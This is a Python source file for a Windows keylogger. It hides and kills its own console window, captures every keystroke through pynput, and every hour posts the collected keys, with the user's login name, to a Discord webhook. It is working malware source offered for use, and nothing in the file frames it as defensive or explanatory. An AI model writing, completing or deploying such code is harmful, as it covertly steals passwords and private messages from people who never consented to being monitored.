from pynput import keyboard
import string
import getpass
import ctypes
import os
import win32process
import requests
import time
import threading


url = "" # Discord webhook url
send_each = 3600 # Delay in seconds before sending keys to webhook (repeats)


start = time.time()
logs = []


hwnd = ctypes.windll.kernel32.GetConsoleWindow()      # Credit for hiding console window:
if hwnd != 0:                                         # https://stackoverflow.com/questions/1689015/run-python-script-without-windows-console-appearing 
    ctypes.windll.user32.ShowWindow(hwnd, 0)      
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    os.system('taskkill /PID ' + str(pid) + ' /f')

def webhook(logs):
    data = {
    "content" : f'```\n{"".join(logs)}\n```',
    "username" : getpass.getuser()
    }
    
    result = requests.post(url, json = data)
    print(result.text)
    logs = []

    

def pressed(key):
    global start


    try:
        r = False
        key = key.char
    except:
        key = key
        r = True
        pass

    if "Key" in str(key):
        key = str(key).replace("Key.", "")

    if key == "enter":
        key = "\n"

    elif key == "space":
        key = " "

    elif r == True: 
        key = "{"+key+"}"

    logs.append(key)

    if time.time() - start >= send_each:
        webhook(logs)
        start = time.time()


    
with keyboard.Listener(
          on_press=pressed) as listener:
      listener.join()
  
